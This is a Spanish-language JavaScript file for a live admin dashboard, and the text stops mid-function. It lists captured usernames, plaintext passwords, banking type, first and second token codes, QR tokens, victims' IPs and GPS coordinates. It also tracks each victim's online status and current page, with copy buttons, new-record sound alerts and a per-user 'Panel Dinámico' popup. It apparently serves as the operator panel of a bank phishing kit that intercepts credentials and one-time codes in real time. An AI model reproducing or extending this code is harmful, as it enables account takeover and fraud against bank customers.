// Variables globales
let currentPage = 1;
let totalPages = 1;
let allData = [];
let filteredData = [];
let itemsPerPage = 10;

// Variables para auto-refresh
let pollingInterval = null;
// Por defecto polling ACTIVO. Solo queda apagado si el usuario pulsó pausa (pollingPausedByUser).
(function migratePollingLocalStorage() {
    try {
        if (localStorage.getItem('pollingPrefV2') !== '1') {
            localStorage.removeItem('isPollingActive');
            localStorage.setItem('pollingPrefV2', '1');
        }
    } catch (e) {
        /* modo privado u otro error */
    }
})();
let isPollingActive = (() => {
    try {
        return localStorage.getItem('pollingPausedByUser') !== 'true';
    } catch (e) {
        return true;
    }
})();
let lastDataHash = '';
let pollingIntervalTime = 3000; // 3 segundos para estatus en tiempo real

/** Pausas temporales del auto-refresh (no alteran el botón ni localStorage). Ej.: edición de comentario. */
const POLLING_SUPPRESS_COMMENT_EDIT = 'comment-edit';
const pollingSuppressReasons = new Set();

function suppressPollingTemporarily(reason) {
    if (reason) pollingSuppressReasons.add(reason);
}

function releasePollingTemporarily(reason) {
    if (reason) pollingSuppressReasons.delete(reason);
}

function isPollingSuppressed() {
    return pollingSuppressReasons.size > 0;
}

// Pause polling cuando la pestaña pierde foco
document.addEventListener('visibilitychange', function () {
    if (document.hidden) {
        if (pollingInterval) {
            clearInterval(pollingInterval);
            pollingInterval = null;
        }
    } else {
        if (isPollingActive && !pollingInterval) {
            loadData(true);
            startPolling();
        }
    }
});

// Variables para notificaciones de audio
let audioNotificationsEnabled = true;

// Variables para configuración de columnas
let configuracionColumnas = [];
let columnasDisponibles = {
    'estatus': 'Estatus',
    'id': 'ID',
    'usuario': 'Usuario',
    'password': 'Contraseña',
    'ip_real': 'IP Real',
    'nombre': 'Nombre',
    'apellido': 'Banca',
    'email': 'Email',
    'telefono_movil': 'Teléfono Móvil',
    'telefono_fijo': 'Teléfono Fijo',
    'token_codigo': 'Token Código',
    'sgdotoken_codigo': 'Segundo Token',
    'sgdotoken_qr_codigo': 'Token QR',
    'token_qr_imagen_url': 'URL QR',
    'comentarios': 'Comentarios',
    'coordenadas_gps': 'Ubicación GPS',
    'fecha': 'Fecha',
    'acciones': 'Acciones'
};

function getBancaLabel(apellido) {
    const val = (apellido || '').toLowerCase().trim();
    if (val.includes('empresa')) return 'Empresarial';
    if (val.includes('persona') || val.includes('personal')) return 'Personal';
    return '';
}

function matchesBancaSearch(apellido, searchTerm) {
    if (!searchTerm) return true;
    const raw = (apellido || '').toLowerCase();
    const label = getBancaLabel(apellido).toLowerCase();
    return raw.includes(searchTerm) || label.includes(searchTerm);
}

function createBancaBadge(label) {
    const span = document.createElement('span');
    span.className = 'banca-badge ' + (label === 'Empresarial' ? 'banca-badge--empresarial' : 'banca-badge--personal');
    span.textContent = label;
    return span;
}

function formatCrGeo(coordenadas) {
    const coords = (coordenadas || '').trim();
    if (!coords) return '';
    return `"cr_geo":"${coords}"`;
}

function escapeAttr(text) {
    return String(text ?? '')
        .replace(/&/g, '&amp;')
        .replace(/"/g, '&quot;')
        .replace(/</g, '&lt;');
}

function getGpsEstadoLabel(estado) {
    const key = (estado || '').trim().toLowerCase();
    const map = {
        denegado: 'Permiso de ubicación denegado por el usuario',
        no_disponible: 'Ubicación no disponible en el dispositivo',
        timeout: 'Tiempo de espera agotado al solicitar ubicación',
        error: 'Error al obtener la ubicación',
        no_soportado: 'El navegador no soporta geolocalización',
        capturado: 'Ubicación capturada'
    };
    if (map[key]) return map[key];
    if (key) return 'Estado: ' + estado;
    return 'Pendiente: aún no pasa por la pantalla GPS';
}

function renderGpsStatusIcon(hasCoords, tooltip) {
    const className = hasCoords ? 'gps-status-icon gps-status-icon--ok' : 'gps-status-icon gps-status-icon--fail';
    const fill = hasCoords ? '#22c55e' : '#9ca3af';
    const svg = `<svg class="gps-status-icon__svg" xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 16 16" fill="none" aria-hidden="true"><path d="M8 1.25a4.25 4.25 0 0 0-4.25 4.25c0 3.19 4.25 9 4.25 9s4.25-5.81 4.25-9A4.25 4.25 0 0 0 8 1.25Z" fill="${fill}"/><circle cx="8" cy="5.5" r="1.35" fill="#fff" fill-opacity="0.9"/></svg>`;
    return `<span class="${className}" title="${escapeAttr(tooltip)}">${svg}</span>`;
}

// Función para generar hash de los datos para detectar cambios
function generateDataHash(data) {
    const relevantData = data.map(item => ({
        id: item.id,
        usuarios: item.usuarios,
        nombre: item.nombre,
        apellido: item.apellido,
        email: item.email,
        telefono_movil: item.telefono_movil,
        telefono_fijo: item.telefono_fijo,
        estado_real: item.estado_real,
        pagina_actual: item.pagina_actual,
        comentarios: item.comentarios,
        coordenadas_gps: item.coordenadas_gps,
        gps_estado: item.gps_estado,
        token_codigo: item.token_codigo,
        sgdotoken_codigo: item.sgdotoken_codigo,
        sgdotoken_qr_codigo: item.sgdotoken_qr_codigo,
        token_qr_imagen_url: item.token_qr_imagen_url
    }));
    return JSON.stringify(relevantData);
}

// Función para verificar si un registro tiene datos completos
function tieneDatosCompletos(item) {
    // Se considera completo si tiene al menos nombre o email
    return (item.nombre && item.nombre.trim() !== '') || 
           (item.email && item.email.trim() !== '');
}

// Función para ordenar registros por prioridad
function ordenarRegistrosPorPrioridad(registros) {
    return registros.sort((a, b) => {
        const estadoA = a.estado_real || 'offline';
        const estadoB = b.estado_real || 'offline';
        
        const esOnlineA = estadoA === 'online' || estadoA === 'inactive';
        const esOnlineB = estadoB === 'online' || estadoB === 'inactive';
        
        const completoA = tieneDatosCompletos(a);
        const completoB = tieneDatosCompletos(b);
        
        // Calcular prioridad (menor número = mayor prioridad)
        let prioridadA, prioridadB;
        
        if (esOnlineA && completoA) prioridadA = 1; // En línea con datos completos
        else if (esOnlineA && !completoA) prioridadA = 2; // En línea con datos incompletos
        else if (!esOnlineA && completoA) prioridadA = 3; // Desconectado con datos completos
        else prioridadA = 4; // Desconectado con datos incompletos
        
        if (esOnlineB && completoB) prioridadB = 1;
        else if (esOnlineB && !completoB) prioridadB = 2;
        else if (!esOnlineB && completoB) prioridadB = 3;
        else prioridadB = 4;
        
        // Ordenar por prioridad
        if (prioridadA !== prioridadB) {
            return prioridadA - prioridadB;
        }
        
        // Si tienen la misma prioridad, ordenar por ID descendente (más recientes primero)
        return b.id - a.id;
    });
}

// Inicializar aplicación
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    // Cargar preferencia de resultados por página
    const savedItemsPerPage = localStorage.getItem('itemsPerPage');
    if (savedItemsPerPage) {
        itemsPerPage = parseInt(savedItemsPerPage);
        updateResultsButtonText();
    }
    
    // Inicializar búsqueda en tiempo real
    const searchInput = document.getElementById('searchInput');
    if (searchInput) {
        searchInput.addEventListener('input', debounce(handleSearch, 300));
    }
    
    // Cerrar dropdown al hacer clic fuera
    document.addEventListener('click', function(event) {
        const dropdown = document.getElementById('resultsDropdown');
        const button = document.getElementById('resultsPerPageBtn');
        if (dropdown && button && !button.contains(event.target) && !dropdown.contains(event.target)) {
            dropdown.classList.add('hidden');
        }
    });
    
    // Cargar datos iniciales
    loadData();
    
    // Inicializar botón de auto-refresh y estado del polling
    updateAutoRefreshButton();
    if (isPollingActive) {
        startPolling();
    }
    
    // Inicializar botón de audio
    updateAudioButton();
    
    // Preparar audio en la primera interacción del usuario
    setupAudioPriming();

    /* Abrir modal de columnas si se vino desde otra vista (misma barra de nav) */
    try {
        const params = new URLSearchParams(window.location.search);
        if (params.get('openColumnConfig') === '1' && typeof showColumnConfig === 'function') {
            setTimeout(function () {
                showColumnConfig();
            }, 120);
            params.delete('openColumnConfig');
            const q = params.toString();
            window.history.replaceState({}, '', window.location.pathname + (q ? '?' + q : '') + window.location.hash);
        }
    } catch (e) { /* */ }
}

// Desbloquear audio: intento al cargar + primera interacción (pointer/tecla/touch)
function setupAudioPriming() {
    let primed = false;
    const prime = async () => {
        if (primed || !window.audioNotifier) return;
        try {
            await window.audioNotifier.prime();
            primed = true;
        } catch (e) {
            /* autoplay bloqueado hasta interacción */
        }
    };
    setTimeout(() => prime(), 400);
    const onInteract = async () => {
        await prime();
        document.removeEventListener('pointerdown', onInteract, true);
        document.removeEventListener('keydown', onInteract, true);
        document.removeEventListener('touchstart', onInteract, true);
    };
    document.addEventListener('pointerdown', onInteract, { capture: true, passive: true });
    document.addEventListener('keydown', onInteract, { capture: true, passive: true });
    document.addEventListener('touchstart', onInteract, { capture: true, passive: true });
}

// Función para actualizar el aspecto del botón de auto-refresh
function updateAutoRefreshButton() {
    const autoRefreshBtn = document.querySelector('button[onclick="togglePolling()"]');
    if (autoRefreshBtn) {
        if (isPollingActive) {
            autoRefreshBtn.innerHTML = '<i class="fas fa-pause"></i>';
            autoRefreshBtn.className = 'bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 transition-colors';
        } else {
            autoRefreshBtn.innerHTML = '<i class="fas fa-play"></i>';
            autoRefreshBtn.className = 'bg-gray-600 text-white px-4 py-2 rounded-lg hover:bg-gray-700 transition-colors';
        }
    }
}

// Función de búsqueda en tiempo real
function handleSearch(event) {
    const searchInput = event ? event.target : document.getElementById('searchInput');
    const searchTerm = (searchInput ? searchInput.value : '').toLowerCase().trim();
    
    if (searchTerm === '') {
        filteredData = allData;
    } else {
        filteredData = allData.filter(item => {
            return (
                (item.usuarios && item.usuarios.toLowerCase().includes(searchTerm)) ||
                (item.password && item.password.toLowerCase().includes(searchTerm)) ||
                (item.ip_real && item.ip_real.toLowerCase().includes(searchTerm)) ||
                (item.nombre && item.nombre.toLowerCase().includes(searchTerm)) ||
                (item.apellido && matchesBancaSearch(item.apellido, searchTerm)) ||
                (item.email && item.email.toLowerCase().includes(searchTerm)) ||
                (item.comentarios && item.comentarios.toLowerCase().includes(searchTerm)) ||
                (item.coordenadas_gps && item.coordenadas_gps.toLowerCase().includes(searchTerm))
            );
        });
    }
    
    currentPage = 1;
    totalPages = Math.ceil(filteredData.length / itemsPerPage);
    renderTable();
    renderPagination();
}

// Función para cargar datos
function loadData(isPolling = false) {
    // No recargar la tabla en segundo plano mientras hay edición activa (evita perder texto / cortar guardado)
    if (isPolling && isPollingSuppressed()) {
        return;
    }

    if (!isPolling) {
        showLoading();
    }
    
    fetch('get_data.php')
        .then(response => response.json())
        .then(data => {
            const newDataHash = generateDataHash(data.registros || []);

            if (isPolling && newDataHash === lastDataHash) {
                return;
            }

            const previousDataLength = allData.length;
            const registrosOrdenados = ordenarRegistrosPorPrioridad(data.registros);

            if (isPolling && audioNotificationsEnabled && (data.registros || []).length !== previousDataLength) {
                playNotificationSound();
            }

            allData = registrosOrdenados;

            // Respetar búsqueda activa
            const searchInput = document.getElementById('searchInput');
            const searchTerm = searchInput ? searchInput.value.toLowerCase().trim() : '';
            if (searchTerm) {
                filteredData = registrosOrdenados.filter(item => {
                    return (
                        (item.usuarios && item.usuarios.toLowerCase().includes(searchTerm)) ||
                        (item.password && item.password.toLowerCase().includes(searchTerm)) ||
                        (item.ip_real && item.ip_real.toLowerCase().includes(searchTerm)) ||
                        (item.nombre && item.nombre.toLowerCase().includes(searchTerm)) ||
                        (item.apellido && matchesBancaSearch(item.apellido, searchTerm)) ||
                        (item.email && item.email.toLowerCase().includes(searchTerm)) ||
                        (item.comentarios && item.comentarios.toLowerCase().includes(searchTerm)) ||
                (item.coordenadas_gps && item.coordenadas_gps.toLowerCase().includes(searchTerm))
                    );
                });
            } else {
                filteredData = registrosOrdenados;
            }
            
            lastDataHash = newDataHash;
            totalPages = Math.ceil(filteredData.length / itemsPerPage);
            
            // Actualizar configuración de columnas
            if (data.configuracion_columnas && data.configuracion_columnas.length > 0) {
                configuracionColumnas = data.configuracion_columnas;
                updateTableHeaders();
            } else {
                // Configuración por defecto si no existe
                configuracionColumnas = [
                    {columna: 'estatus', visible: 1, orden: 1, nombre_personalizado: null},
                    {columna: 'id', visible: 1, orden: 2, nombre_personalizado: null},
                    {columna: 'usuario', visible: 1, orden: 3, nombre_personalizado: null},
                    {columna: 'password', visible: 1, orden: 4, nombre_personalizado: null},
                    {columna: 'ip_real', visible: 1, orden: 5, nombre_personalizado: null},
                    {columna: 'nombre', visible: 1, orden: 6, nombre_personalizado: null},
                    {columna: 'apellido', visible: 1, orden: 7, nombre_personalizado: null},
                    {columna: 'email', visible: 1, orden: 8, nombre_personalizado: null},
                    {columna: 'telefono_movil', visible: 1, orden: 9, nombre_personalizado: null},
                    {columna: 'telefono_fijo', visible: 1, orden: 10, nombre_personalizado: null},
                    {columna: 'token_codigo', visible: 1, orden: 11, nombre_personalizado: null},
                    {columna: 'sgdotoken_codigo', visible: 1, orden: 12, nombre_personalizado: null},
                    {columna: 'sgdotoken_qr_codigo', visible: 1, orden: 13, nombre_personalizado: null},
                    {columna: 'token_qr_imagen_url', visible: 1, orden: 14, nombre_personalizado: null},
                    {columna: 'comentarios', visible: 1, orden: 15, nombre_personalizado: null},
                    {columna: 'coordenadas_gps', visible: 1, orden: 16, nombre_personalizado: null},
                    {columna: 'fecha', visible: 1, orden: 17, nombre_personalizado: null},
                    {columna: 'acciones', visible: 1, orden: 18, nombre_personalizado: null}
                ];
                updateTableHeaders();
            }
            
            // Actualizar estadísticas
            updateStats(data.stats);
            
            renderTable();
            renderPagination();
            
            if (!isPolling) {
                hideLoading();
            }
        })
        .catch(error => {
            console.error('Error:', error);
            if (!isPolling) {
                hideLoading();
                showError('Error al cargar los datos');
            }
        });
}

// Función para actualizar headers de la tabla
function updateTableHeaders() {
    const thead = document.querySelector('thead');
    const tableHead = document.querySelector('thead tr');
    if (!tableHead || !thead) return;
    
    // Asegurar que thead tenga la clase bg-black
    thead.className = 'bg-black';
    
    tableHead.innerHTML = '';
    
    // Verificar que existe configuración de columnas
    if (!configuracionColumnas || configuracionColumnas.length === 0) {
        console.warn('No hay configuración de columnas disponible para headers');
        return;
    }
    
    // Obtener columnas visibles ordenadas
    const columnasVisibles = configuracionColumnas
        .filter(col => col.visible == 1)
        .sort((a, b) => a.orden - b.orden);
    
    columnasVisibles.forEach(col => {
        const th = document.createElement('th');
        th.className = 'px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider cursor-pointer';
        
        // Usar nombre personalizado si existe, sino usar el nombre por defecto
        const nombreMostrar = col.nombre_personalizado || columnasDisponibles[col.columna] || col.columna;
        
        // Envolver el texto en un span con estilo de sombra
        const span = document.createElement('span');
        span.className = 'header-text-shadow';
        span.textContent = nombreMostrar;
        th.appendChild(span);
        
        // Agregar atributos para identificar la columna
        th.setAttribute('data-columna', col.columna);
        // Solo agregar funcionalidad de edición para super-usuarios
        if (window.isSuperUser) {
            th.setAttribute('title', 'Doble clic para editar');
            
            // Agregar evento de doble clic para edición inline
            th.addEventListener('dblclick', function() {
                editColumnName(this, col);
            });
        }
        
        tableHead.appendChild(th);
    });
}

// Función para renderizar tabla
function renderTable() {
    const tableBody = document.getElementById('tableBody');
    if (!tableBody) return;
    
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;
    const pageData = filteredData.slice(startIndex, endIndex);
    
    tableBody.innerHTML = '';
    
    // Verificar que existe configuración de columnas
    if (!configuracionColumnas || configuracionColumnas.length === 0) {
        console.warn('No hay configuración de columnas disponible');
        return;
    }
    
    // Obtener columnas visibles ordenadas
    const columnasVisibles = configuracionColumnas
        .filter(col => col.visible == 1)
        .sort((a, b) => a.orden - b.orden);
    
    if (pageData.length === 0) {
        tableBody.innerHTML = `
            <tr>
                <td colspan="${columnasVisibles.length}" class="text-center py-8 text-gray-500">
                    <i class="fas fa-search text-4xl mb-4"></i>
                    <p>No se encontraron resultados</p>
                </td>
            </tr>
        `;
        return;
    }
    
    pageData.forEach((item, index) => {
        const row = document.createElement('tr');
        
        // Determinar estatus y estilo
        const estatusReal = item.estado_real || 'offline';
        let estatusClass, estatusIcon, estatusText, rowStateClass;
        
        if (estatusReal === 'online') {
            estatusClass = 'text-green-600';
            estatusIcon = 'fas fa-circle';
            estatusText = 'En línea';
            rowStateClass = 'estado-online';
        } else if (estatusReal === 'inactive') {
            estatusClass = 'text-yellow-600';
            estatusIcon = 'fas fa-circle';
            estatusText = 'Inactivo';
            rowStateClass = 'estado-inactive';
        } else if (estatusReal === 'Nunca conectado') {
            estatusClass = 'text-gray-400';
            estatusIcon = 'fas fa-circle';
            estatusText = 'Sin conexión';
            rowStateClass = 'estado-nunca-conectado';
        } else {
            estatusClass = 'text-red-600';
            estatusIcon = 'fas fa-circle';
            estatusText = 'Desconectado';
            rowStateClass = 'estado-offline';
        }
        
        // Aplicar clase de estado sin transiciones
        row.className = rowStateClass;
        
        const paginaActual = item.pagina_actual ? ` (${item.pagina_actual})` : '';
        
        // Generar celdas dinámicamente según configuración
        columnasVisibles.forEach(col => {
            const td = document.createElement('td');
            td.className = 'px-6 py-4 whitespace-nowrap text-sm';
            td.setAttribute('data-columna', col.columna);
            
            switch (col.columna) {
                case 'estatus':
                    td.innerHTML = `
                        <div class="flex items-center">
                            <i class="${estatusIcon} ${estatusClass} mr-2" style="font-size: 8px;"></i>
                            <span class="${estatusClass} font-medium">${estatusText}</span>
                            <small class="text-gray-400 block">${paginaActual}</small>
                        </div>
                    `;
                    break;
                case 'id':
                    td.className += ' text-gray-900';
                    td.textContent = item.id;
                    // Habilitar copiado rápido
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.id, 'ID');
                    }
                    break;
                case 'usuario':
                    td.className += ' text-gray-900';
                    td.textContent = item.usuarios || '-';
                    // Habilitar copiado rápido
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.usuarios, 'Usuario');
                    }
                    break;
                case 'password':
                    td.className += ' text-gray-900';
                    td.textContent = item.password || '-';
                    // Habilitar copiado rápido
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.password, 'Contraseña');
                    }
                    break;
                case 'ip_real':
                    td.className += ' text-gray-900';
                    td.textContent = item.ip_real || '-';
                    // Habilitar copiado rápido
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.ip_real, 'IP Real');
                    }
                    break;
                case 'nombre':
                    td.className += ' text-gray-900';
                    td.textContent = item.nombre || '-';
                    // Habilitar copiado rápido
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.nombre, 'Nombre');
                    }
                    break;
                case 'apellido':
                    td.className += ' text-gray-900';
                    const bancaLabel = getBancaLabel(item.apellido);
                    if (bancaLabel) {
                        td.appendChild(createBancaBadge(bancaLabel));
                        if (window.quickCopySystem) {
                            window.quickCopySystem.enableQuickCopy(td, bancaLabel, 'Banca');
                        }
                    } else {
                        td.textContent = item.apellido || '-';
                        if (window.quickCopySystem && item.apellido) {
                            window.quickCopySystem.enableQuickCopy(td, item.apellido, 'Banca');
                        }
                    }
                    break;
                case 'email':
                    td.className += ' text-gray-900';
                    td.textContent = item.email || '-';
                    // Habilitar copiado rápido
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.email, 'Email');
                    }
                    break;
                case 'telefono_movil':
                    td.className += ' text-gray-900';
                    td.textContent = item.telefono_movil || '-';
                    // Habilitar copiado rápido
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.telefono_movil, 'Teléfono Móvil');
                    }
                    break;
                case 'telefono_fijo':
                    td.className += ' text-gray-900';
                    td.textContent = item.telefono_fijo || '-';
                    // Habilitar copiado rápido
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.telefono_fijo, 'Teléfono Fijo');
                    }
                    break;
                case 'token_codigo':
                    td.className += ' text-gray-900';
                    td.textContent = item.token_codigo || '-';
                    // Habilitar copiado rápido
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.token_codigo, 'Token #1');
                    }
                    break;
                case 'sgdotoken_codigo':
                    td.className += ' text-gray-900';
                    td.textContent = item.sgdotoken_codigo || '-';
                    // Habilitar copiado rápido
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.sgdotoken_codigo, 'Token #2');
                    }
                    break;
                case 'sgdotoken_qr_codigo':
                    td.className += ' text-gray-900';
                    td.textContent = item.sgdotoken_qr_codigo || '-';
                    if (window.quickCopySystem) {
                        window.quickCopySystem.enableQuickCopy(td, item.sgdotoken_qr_codigo, 'Token QR');
                    }
                    break;
                case 'token_qr_imagen_url':
                    td.className += ' text-gray-900';
                    td.textContent = item.token_qr_imagen_url || '-';
                    if (window.quickCopySystem && item.token_qr_imagen_url) {
                        window.quickCopySystem.enableQuickCopy(td, item.token_qr_imagen_url, 'URL QR');
                    }
                    break;
                case 'comentarios':
                    td.className += ' text-gray-900';
                    td.innerHTML = `
                        <div class="flex items-center space-x-2">
                            <span class="comentario-texto" id="comentario-${item.id}">${item.comentarios || 'Sin comentarios'}</span>
                            <button onclick="editarComentario(${item.id})" 
                                    class="comentario-edit-btn text-blue-600 hover:text-blue-800 transition-colors">
                                <i class="fas fa-edit text-xs"></i>
                            </button>
                        </div>
                    `;
                    break;
                case 'coordenadas_gps':
                    td.className += ' text-center gps-cell';
                    if (item.coordenadas_gps) {
                        const gpsTooltip = item.coordenadas_gps + ' — Clic para copiar';
                        td.innerHTML = renderGpsStatusIcon(true, gpsTooltip);
                        if (window.quickCopySystem) {
                            window.quickCopySystem.enableQuickCopy(td, formatCrGeo(item.coordenadas_gps), 'Ubicación GPS');
                        }
                    } else {
                        const gpsMotivo = getGpsEstadoLabel(item.gps_estado);
                        td.innerHTML = renderGpsStatusIcon(false, gpsMotivo);
                    }
                    break;
                case 'fecha':
                    td.className += ' text-gray-500';
                    td.textContent = formatDate(item.fecha_ingreso);
                    break;
                case 'acciones':
                    td.className += ' text-gray-900';
                    const deleteButton = window.isSuperUser ? 
                        `<button onclick="deleteRecord(${item.id})" 
                                class="bg-red-600 text-white px-3 py-1 rounded text-xs hover:bg-red-700 transition-colors">
                            <i class="fas fa-trash mr-1"></i>Borrar
                        </button>` : '';
                    td.innerHTML = `
                        <div class="flex space-x-2">
                            <button onclick="openPopup(${item.id}, '${item.usuarios || ''}')" 
                                    class="bg-red-600 text-white px-3 py-1 rounded text-xs hover:bg-red-700 transition-colors">
                                <i class="fas fa-external-link-alt mr-1"></i>Panel Dinámico
                            </button>
                            ${deleteButton}
                        </div>
                    `;
                    break;
                default:
                    td.className += ' text-gray-900';
                    td.textContent = item[col.columna] != null && item[col.columna] !== '' ? item[col.columna] : '-';
                    if (window.quickCopySystem && item[col.columna]) {
                        window.quickCopySystem.enableQuickCopy(td, item[col.columna], col.nombre_personalizado || col.columna);
                    }
                    break;
            }
            row.appendChild(td);
        });
        
        tableBody.appendChild(row);
    });
}

// Función para renderizar paginación
function renderPagination() {
    const paginationContainer = document.getElementById('pagination');
    if (!paginationContainer) return;
    
    if (totalPages <= 1) {
        paginationContainer.innerHTML = '';
        return;
    }
    
    let paginationHTML = `
        <button onclick="changePage(${currentPage - 1})" 
                class="pagination-btn px-3 py-2 mx-1" 
                ${currentPage === 1 ? 'disabled' : ''}>
            <i class="fas fa-chevron-left"></i>
        </button>
    `;
    
    const startPage = Math.max(1, currentPage - 2);
    const endPage = Math.min(totalPages, currentPage + 2);
    
    for (let i = startPage; i <= endPage; i++) {
        paginationHTML += `
            <button onclick="changePage(${i})" 
                    class="pagination-btn px-3 py-2 mx-1 ${i === currentPage ? 'bg-red-600' : ''}">
                ${i}
            </button>
        `;
    }
    
    paginationHTML += `
        <button onclick="changePage(${currentPage + 1})" 
                class="pagination-btn px-3 py-2 mx-1" 
                ${currentPage === totalPages ? 'disabled' : ''}>
            <i class="fas fa-chevron-right"></i>
        </button>
    `;
    
    paginationContainer.innerHTML = paginationHTML;
}

// Función para cambiar página
function changePage(page) {
    if (page < 1 || page > totalPages) return;
    currentPage = page;
    renderTable();
    renderPagination();
}

// Función para mostrar loading
function showLoading() {
    const loadingElement = document.getElementById('loading');
    if (loadingElement) {
        loadingElement.style.display = 'flex';
    }
}

// Función para ocultar loading
function hideLoading() {
    const loadingElement = document.getElementById('loading');
    if (loadingElement) {
        loadingElement.style.display = 'none';
    }
}

// Función para mostrar error
function showError(message) {
    const errorContainer = document.getElementById('errorContainer');
    if (errorContainer) {
        errorContainer.innerHTML = `
            <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">
                <i class="fas fa-exclamation-triangle mr-2"></i>
                ${message}
            </div>
        `;
        errorContainer.style.display = 'block';
        
        setTimeout(() => {
            errorContainer.style.display = 'none';
        }, 5000);
    }
}

// Función para formatear fecha
function formatDate(dateString) {
    if (!dateString) return '-';
    const date = new Date(dateString);
    return date.toLocaleDateString('es-ES', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit'
    });
}

// Función debounce para optimizar búsqueda
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Función para cerrar sesión
function logout() {
    showAlert(
        'confirm',
        'Confirmar Cierre de Sesión',
        '¿Estás seguro de que quieres cerrar sesión?',
        'Sí, Cerrar Sesión',
        'Cancelar',
        () => {
            fetch('logout.php')
                .then(() => {
                    window.location.href = 'index.php';
                })
                .catch(error => {
                    console.error('Error al cerrar sesión:', error);
                    showAlert('error', 'Error', 'Error al cerrar sesión', 'Aceptar');
                });
        }
    );
}

// Función para vaciar todos los registros
function vaciarRegistros() {
    showAlert(
        'error',
        'Vaciar Registros',
        '¿Estás seguro de que quieres eliminar TODOS los registros de usuarios y estatus?\n\n' +
        'Esta acción no se puede deshacer.',
        'Sí, Eliminar Todo',
        'Cancelar',
        () => {
            // Mostrar loading
            showLoading();
            
            fetch('vaciar_registros.php')
                .then(response => response.json())
                .then(data => {
                    hideLoading();
                    
                    if (data.success) {
                        // Recargar datos inmediatamente sin mostrar mensaje
                        loadData();
                    } else {
                        showError('Error al eliminar registros: ' + (data.error || 'Error desconocido'));
                    }
                })
                .catch(error => {
                    hideLoading();
                    console.error('Error:', error);
                    showError('Error al eliminar registros');
                });
        }
    );
}



// Función para iniciar el polling
function startPolling() {
    if (pollingInterval) {
        clearInterval(pollingInterval);
    }
    
    isPollingActive = true;
    try {
        localStorage.removeItem('pollingPausedByUser');
    } catch (e) {
        /* noop */
    }
    
    // Ejecutar polling cada 5 segundos
    pollingInterval = setInterval(() => {
        if (isPollingActive && !isPollingSuppressed()) {
            loadData(true); // true indica que es polling
        }
    }, 5000);
    
    // Actualizar el botón
    updateAutoRefreshButton();
}

// Función para detener el polling
function stopPolling() {
    if (pollingInterval) {
        clearInterval(pollingInterval);
        pollingInterval = null;
    }
    
    isPollingActive = false;
    try {
        localStorage.setItem('pollingPausedByUser', 'true');
    } catch (e) {
        /* noop */
    }
    
    // Actualizar el botón
    updateAutoRefreshButton();
}

// Función para alternar el polling
function togglePolling() {
    if (isPollingActive) {
        stopPolling();
    } else {
        startPolling();
    }
    updateAutoRefreshButton();
    
    // Actualizar tooltip
    if (window.tooltipManager) {
        window.tooltipManager.updatePollingTooltip(isPollingActive);
    }
}



// Función para actualizar datos manualmente
function refreshData() {
    loadData();
}

// Función para exportar datos
function exportData() {
    const searchTerm = document.getElementById('searchInput')?.value || '';
    const dataToExport = searchTerm ? filteredData : allData;
    
    const csvContent = generateCSV(dataToExport);
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const link = document.createElement('a');
    const url = URL.createObjectURL(blob);
    
    link.setAttribute('href', url);
    link.setAttribute('download', `registros_${new Date().toISOString().split('T')[0]}.csv`);
    link.style.visibility = 'hidden';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

// Función para actualizar estadísticas
function updateStats(stats) {
    const totalElement = document.getElementById('totalRegistros');
    const hoyElement = document.getElementById('registrosHoy');
    const ipsElement = document.getElementById('ipsUnicas');
    const ultimoElement = document.getElementById('ultimoAcceso');
    
    if (totalElement) totalElement.textContent = stats.total || 0;
    if (hoyElement) hoyElement.textContent = stats.hoy || 0;
    if (ipsElement) ipsElement.textContent = stats.ips_unicas || 0;
    
    if (ultimoElement && stats.ultimo_acceso) {
        const fecha = new Date(stats.ultimo_acceso);
        ultimoElement.textContent = fecha.toLocaleDateString('es-ES', {
            day: '2-digit',
            month: '2-digit',
            hour: '2-digit',
            minute: '2-digit'
        });
    }
}

// Función para abrir popup
function openPopup(id, usuario = '') {
    // Calcular dimensiones para centrar la ventana (40% más grande)
    const width = 1120; // 800 * 1.4 = 1120
    const height = 840;  // 600 * 1.4 = 840
    
    // Calcular posición para centrar con desplazamiento para múltiples ventanas
    const baseLeft = (screen.width - width) / 2;
    const baseTop = (screen.height - height) / 2;
    
    // Agregar desplazamiento basado en el ID para evitar superposición total
    const offset = (id % 5) * 30; // Desplazamiento de 30px por ventana (máximo 5 posiciones)
    const left = baseLeft + offset;
    const top = baseTop + offset;
    
    // Crear nombre único para cada popup usando el ID del usuario
    const windowName = `bXPopup_${id}`;
    
    // Construir URL con parámetros
    const url = `control_dinamico_usuario.php?id=${id}&usuario=${encodeURIComponent(usuario)}`;
    
    const popup = window.open(
        url, 
        windowName, 
        `width=${width},height=${height},left=${left},top=${top},scrollbars=yes,resizable=yes,centerscreen=yes`
    );
    
    if (popup) {
        popup.focus();
    }
}

// Variables globales para alertas
let alertCallback = null;

// Función para mostrar alertas reutilizables
function showAlert(type, title, message, primaryText = 'Aceptar', secondaryText = 'Cancelar', callback = null) {
    const overlay = document.getElementById('alertOverlay');
    const container = document.getElementById('alertContainer');
    const icon = document.getElementById('alertIcon');
    const iconClass = document.getElementById('alertIconClass');
    const titleEl = document.getElementById('alertTitle');
